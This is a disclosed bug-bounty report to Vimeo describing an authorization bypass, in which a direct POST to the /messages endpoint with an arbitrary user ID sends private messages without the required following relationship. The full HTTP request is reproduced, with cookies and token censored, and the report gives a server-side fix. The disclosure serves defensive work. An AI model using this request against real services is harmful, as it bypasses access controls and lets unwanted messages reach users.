# Can message users without the proper authorization

## Report Details
- **Report ID**: 46113
- **URL**: https://hackerone.com/reports/46113
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2015-02-02T12:21:16.460Z
- **Disclosed**: 2015-04-01T14:25:03.844Z

## Reporter
- **Username**: jkjkjk
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: vimeo

## Vulnerability Information
It shouldn't be possible to send messages to users without following users:

> You must be following at least one Vimeo member before you can send a private message. To get started, find a friend, family member, or someone with cool videos and click the "Follow" button on their profile page. 

It's possible to bypass that by just sending a POST request to `/messages`:

```
POST /messages HTTP/1.1
Host: vimeo.com
User-Agent: [CENSORED]
Accept: text/html, application/xml, text/xml, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Referer: https://vimeo.com/messages
Content-Length: 141
Cookie: [CENSORED]
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

name=Jens>&text=blaat&action=send_message&lightbox=true&user=[ANY USER ID HERE]&token=[CENSORED]
```

You can replace the `user` parameter with any random user ID and it will send the message without any issues.

**Fix:**
Add proper server side authorization on the `/messages` endpoint.

## Attachments
No attachments
